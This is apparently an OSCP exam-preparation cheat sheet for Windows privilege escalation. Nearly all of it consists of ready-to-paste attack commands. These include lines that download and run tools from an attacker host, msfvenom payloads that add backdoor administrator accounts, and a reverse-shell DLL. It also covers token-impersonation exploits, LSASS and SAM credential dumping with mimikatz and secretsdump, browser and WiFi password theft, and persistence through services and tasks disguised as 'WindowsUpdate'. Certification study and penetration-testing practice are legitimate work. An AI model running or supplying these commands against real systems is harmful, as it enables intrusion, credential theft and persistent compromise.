# OSCP Windows Privilege Escalation Master Guide

## Table of Contents
- [Initial Enumeration](#initial-enumeration)
- [Automated Scripts](#automated-scripts)
- [Manual Enumeration](#manual-enumeration)
- [Privilege Escalation Techniques](#privilege-escalation-techniques)
- [Post-Exploitation](#post-exploitation)
- [Common Mistakes](#common-mistakes)

## Initial Enumeration

### Basic System Information (Copy-Paste Ready)
```cmd
# Current user and privileges
whoami
whoami /priv
whoami /groups

# System information
systeminfo
hostname
ver

# Network configuration
ipconfig /all
route print
arp -A
netstat -ano

# Users and groups
net users
net localgroup
net localgroup administrators
net user <username>
```

### PowerShell Commands
```powershell
# System info
Get-ComputerInfo
Get-WmiObject -Class Win32_OperatingSystem
Get-WmiObject -Class Win32_ComputerSystem

# Current user privileges
[System.Security.Principal.WindowsIdentity]::GetCurrent()

# Installed programs
Get-WmiObject -Class Win32_Product
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate

# Running processes with full path
Get-WmiObject win32_process | Select-Object ProcessId,ParentProcessId,CommandLine,ExecutablePath

# Environment variables
Get-ChildItem Env: | ft Key,Value

# Network connections  
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
```

## Automated Scripts

### WinPEAS (Recommended)
```cmd
# Download and run (adjust URL as needed)
certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe winpeas.exe
winpeas.exe

# Alternative download methods
powershell.exe -c "(New-Object Net.WebClient).DownloadFile('http://<attacker-ip>/winPEAS.exe','winpeas.exe')"
powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/winPEAS.bat')"
```

### PowerUp (PowerShell)
```powershell
# Download and import
powershell -ep bypass
IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ServiceFilePermission
Get-UnattendedInstallFile
```

### Seatbelt
```cmd
# Download and run
Seatbelt.exe -group=all
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=misc

# Specific modules
Seatbelt.exe WindowsAutoLogon
Seatbelt.exe LSASettings
Seatbelt.exe CredEnum
```

### JAWS (PowerShell)
```powershell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
```

## Manual Enumeration

### File System Enumeration
```cmd
# Check common directories for interesting files
dir C:\Users\%USERNAME%\Desktop
dir C:\Users\%USERNAME%\Documents  
dir C:\Users\%USERNAME%\Downloads
dir C:\Users\Public

# Search for files containing passwords
findstr /si password *.txt
findstr /si password *.xml  
findstr /si password *.ini
findstr /si password *.config

# Search for files with specific extensions
dir /s *.db
dir /s *.config
dir /s *.xml
dir /s *.ini
dir /s *.bat
dir /s *.ps1

# Check for backup files
dir /s *.bak
dir /s *.backup
dir /s *.old
```

### Registry Enumeration
```cmd
# AlwaysInstallElevated (allows MSI packages to run as SYSTEM)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query HKCU\Software\SimonTatham\PuTTY\Sessions

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# Auto-logon credentials  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### Service Enumeration
```cmd
# List all services
sc query type= service state= all
wmic service list full

# Get detailed service info
sc qc <service-name>
sc queryex <service-name>

# Check service permissions
icacls "C:\path\to\service.exe"

# PowerShell alternative
Get-WmiObject win32_service | Select-Object Name, DisplayName, State, PathName
```

### Scheduled Tasks
```cmd
# List scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo csv /v > tasks.csv

# PowerShell alternative
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName,TaskPath,State

# Check task permissions
icacls C:\Windows\System32\Tasks\<task-name>
```

### Driver Enumeration
```cmd
# List loaded drivers
driverquery /v

# PowerShell alternative  
Get-WmiObject Win32_PnPEntity | Select-Object Name, Manufacturer, Service

# Check for vulnerable drivers
driverquery | findstr /i "kernel"
```

## Privilege Escalation Techniques

### 1. Service Exploits

#### Unquoted Service Paths
```cmd
# Find services with unquoted paths containing spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check if you can write to the path
icacls "C:\Program Files\Vulnerable Service"

# Create malicious executable
msfvenom -p windows/exec CMD="net user hacker Password123! /add && net localgroup administrators hacker /add" -f exe -o "Program.exe"

# Place the file and restart service
copy Program.exe "C:\Program Files\Program.exe"
sc stop <service-name>
sc start <service-name>
```

#### Service Binary Permissions
```cmd
# Find services with modifiable binaries
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

# Replace service binary
copy cmd.exe "C:\path\to\vulnerable-service.exe"
sc stop <service-name>
sc start <service-name>
```

### 2. AlwaysInstallElevated
```cmd
# Check if enabled
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Create malicious MSI
msfvenom -p windows/adduser USER=backdoor PASS=Password123! -f msi -o malicious.msi

# Install MSI (runs as SYSTEM)
msiexec /quiet /qn /i C:\malicious.msi
```

### 3. Registry Permissions
```cmd
# Check service registry permissions
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>

# Modify service ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d "C:\path\to\evil.exe" /f

# Restart service
sc stop <service>
sc start <service>
```

### 4. Token Impersonation

#### SeImpersonatePrivilege
```cmd
# Check for SeImpersonatePrivilege
whoami /priv

# Use JuicyPotato (Windows < Server 2019)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user backdoor Password123! /add && net localgroup administrators backdoor /add" -t * -c {BB6DF56B-CACE-11DC-9992-0019B93A3A84}

# Use PrintSpoofer (Windows Server 2019+)
PrintSpoofer.exe -i -c cmd

# Use RoguePotato
RoguePotato.exe -r <redirector-ip> -e "cmd.exe /c net user backdoor Password123! /add && net localgroup administrators backdoor /add" -l 135
```

#### SeBackupPrivilege  
```cmd
# Check privilege
whoami /priv

# Enable privilege and backup SAM/SYSTEM
reg save hklm\sam sam.hiv
reg save hklm\system system.hiv

# Extract hashes offline
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

### 5. Weak File/Folder Permissions
```cmd
# Find world-writable directories in PATH
for %%A in ("%path:;=";"%") do ( cmd /c icacls "%%~A" 2>nul | findstr /i "(F)" | findstr /i "everyone authenticated users todos" )

# DLL Hijacking - check for missing DLLs
procmon.exe  # Use Process Monitor to identify missing DLLs

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=443 -f dll -o hijack.dll
```

### 6. Kernel Exploits

#### Check System Patches
```cmd
# List installed patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# PowerShell alternative
Get-WmiObject -Class Win32_QuickFixEngineering

# Use Windows Exploit Suggester
systeminfo > systeminfo.txt
python windows-exploit-suggester.py --database 2021-05-27-mssb.xls --systeminfo systeminfo.txt
```

#### Common Kernel Exploits
```cmd
# MS16-032 (PowerShell)
powershell.exe -ExecutionPolicy Bypass -File Invoke-MS16032.ps1

# MS17-010 (EternalBlue)
# Use auxiliary/admin/smb/ms17_010_command in Metasploit

# MS15-051 (Windows 8.1/2012R2)
MS15-051.exe whoami

# MS10-015 (KiTrap0D) - Windows 7/2008/Vista/2003
Exploit.exe
```

### 7. Password Attacks

#### Credential Hunting
```cmd
# Search for credentials in files
findstr /si password *.txt *.xml *.config *.ini
dir /s *pass* == *cred* == *vnc* == *.config*

# Check for stored passwords  
cmdkey /list

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile <SSID> key=clear

# Browser passwords (Chrome example)
copy "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data" login.db
# Use ChromePass or similar tool offline
```

#### Hash Dumping
```cmd
# LSASS dump (requires elevated privileges)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Use mimikatz offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit

# SAM dump
reg save HKLM\sam sam.hiv
reg save HKLM\system system.hiv
impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

## Post-Exploitation

### Persistence Mechanisms
```cmd
# Create new user
net user backdoor Password123! /add
net localgroup administrators backdoor /add

# Registry run key
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /sc onstart /tn "WindowsUpdate" /tr "C:\backdoor.exe" /ru system

# Service creation
sc create "WindowsUpdate" binpath="C:\backdoor.exe" start=auto
sc start "WindowsUpdate"
```

### Information Gathering
```cmd
# Enumerate network shares
net view
net view \\<computer-name>

# Check for cached credentials
cmdkey /list
dir C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\
dir C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\

# Domain information (if domain-joined)
net config workstation
nltest /domain_trusts
```

## Common Mistakes

### 1. Not Checking Basic Misconfigurations
❌ Jumping straight to kernel exploits
✅ Check AlwaysInstallElevated, service permissions, scheduled tasks first

### 2. Missing SeImpersonatePrivilege  
❌ Not checking `whoami /priv`
✅ Always check privileges - SeImpersonatePrivilege is very common

### 3. Not Enumerating Services Properly
❌ Only using `sc query`  
✅ Use multiple methods: sc, wmic, PowerShell, check file permissions

### 4. Ignoring PowerShell
❌ Only using cmd.exe commands
✅ PowerShell provides much more detailed information

### 5. Not Looking for Stored Credentials
❌ Immediately trying exploits
✅ Search filesystem and registry for passwords/keys

## Essential Tools to Transfer

### Must-Have Binaries
```cmd
# Download these to target
certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe
certutil -urlcache -split -f http://<attacker-ip>/accesschk.exe  
certutil -urlcache -split -f http://<attacker-ip>/JuicyPotato.exe
certutil -urlcache -split -f http://<attacker-ip>/PrintSpoofer.exe
certutil -urlcache -split -f http://<attacker-ip>/Seatbelt.exe
```

### PowerShell Scripts
```powershell
# Download and run in memory
IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PowerUp.ps1')
IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/Sherlock.ps1')
IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/Invoke-Mimikatz.ps1')
```

## Time-Saving One-Liners

### Quick Privilege Check
```cmd
whoami /priv | findstr /i "SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege SeBackupPrivilege SeRestorePrivilege"
```

### Service Vulnerability Scan
```cmd
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> services.txt & for /f eol^=^"^ delims^=^" %a in (services.txt) do cmd.exe /c icacls "%a" | findstr /i "everyone authenticated users todos"
```

### Quick Password Hunt
```cmd
findstr /spin "password" *.* 2>nul & findstr /spin "passw" *.* 2>nul & findstr /spin "pwd" *.* 2>nul
```

Remember: Always run automated tools like WinPEAS first, but understand what they're checking so you can perform manual verification and exploitation!